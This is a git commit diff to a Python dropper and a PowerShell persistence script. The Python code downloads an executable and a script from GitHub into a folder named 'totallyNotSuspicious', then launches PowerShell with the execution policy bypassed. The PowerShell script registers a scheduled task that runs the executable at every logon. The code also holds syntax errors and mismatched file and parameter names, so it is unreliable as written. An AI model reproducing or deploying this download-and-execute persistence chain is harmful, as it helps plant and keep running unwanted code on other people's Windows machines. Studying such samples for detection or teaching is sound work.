0f29f58eca86bb9bcc24c8aba313ae7d81a7f552
Acrasy <sai.whocares@gmail.com>
2019-10-10 20:50:02 +0200

    changes

--- codesamples/initialize/code/initialize.py
+++ codesamples/initialize/code/initialize.py
@@ -2,9 +2,16 @@ import subprocess
 from pathlib import Path
 import wget
 import os
-cwd=os.path.join(Path.home(),"Documents","totallyNotSuspicious")
+
+if os.sep = '/':
+	cwd=os.path.join(Path.home(),"Documents","totallyNotSuspicious")
+if os.sep = '\\'
+	cwd=os.path.join(os.path.abspath(os.sep),"totallyNotSuspicious")
+
 os.mkdir(cwd)
 os.chdir(cwd)
+
+wget.download('https://github.com/Acrasy/samples/raw/master/codesamples/print2Desktop/code/print.exe')
 wget.download('https://raw.githubusercontent.com/Acrasy/samples/master/codesamples/initialize/code/persitence.ps1')
 
-psexectaskscheduler = subprocess.Popen([r'C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe','-ExecutionPolicy','Unrestricted','./persistence.ps1'])
+psexectaskscheduler = subprocess.Popen([r'C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe','-NonInteractive','-NoProfile','-ExecutionPolicy','Unrestricted','./persistence.ps1'])
--- codesamples/initialize/code/persitence.ps1
+++ codesamples/initialize/code/persitence.ps1
@@ -7,34 +7,17 @@ Register-ScheduledTask T1 -InputObject $D
 
 Set-ExecutionPolicy Bypass -Scope Process -Force;
 
-$A = New-ScheduledTaskAction -ExecutionPolicy Bypass -Execute 'C:\Users\itunes\Documents\print.exe'
+$A = New-ScheduledTaskAction -ExecutionPolicy Bypass -Execute 'C:\totallyNotSuspicious\print.exe'
 $T = New-ScheduledTaskTrigger -AtLogon
-$S = New-ScheduledTaskSettingsSet
 $P = New-ScheduledTaskPrincipal
 $N = "print2Desktop"
 $D= New-ScheduledTask -Action $A -Trigger $T -Settings $S
 
 Register-ScheduledTask  -InputObject $D -TaskNams $N
 
-#________________________________________________________________________________________
+#___________________________________________________________________________________________________________________________________________________
 
-Set-ExecutionPolicy Bypass -Scope Process -Force;
-
-#Create a new trigger that is configured to trigger at startup
-$STTrigger = New-ScheduledTaskTrigger -AtLogon
-#Name for the scheduled task
-$STName = "print2Desktop"
-#Action to run as
-$STAction = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-ExecutionPolicy Bypass C:\Users\itunes\Documents\print.exe'
-#Configure when to stop the task and how long it can run for. In this example it does not stop on idle and uses the maximum possible duration by setting a timelimit of 0
-$STSettings = New-ScheduledTaskSettingsSet -DontStopOnIdleEnd -ExecutionTimeLimit ([TimeSpan]::Zero)
-#Configure the principal to use for the scheduled task and the level to run as
-$STPrincipal = New-ScheduledTaskPrincipal -GroupId "." -RunLevel "Highest"
-#Register the new scheduled task
-Register-ScheduledTask $STName -Action $STAction -Trigger $STTrigger -Principal $STPrincipal -Settings $STSettings
-
-
-
+#___________________________________________________________________________________________________________________________________________________
 #Key to change run permission of scripts on local machine
 #HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.Powershell
 #PS-cmd to read Key
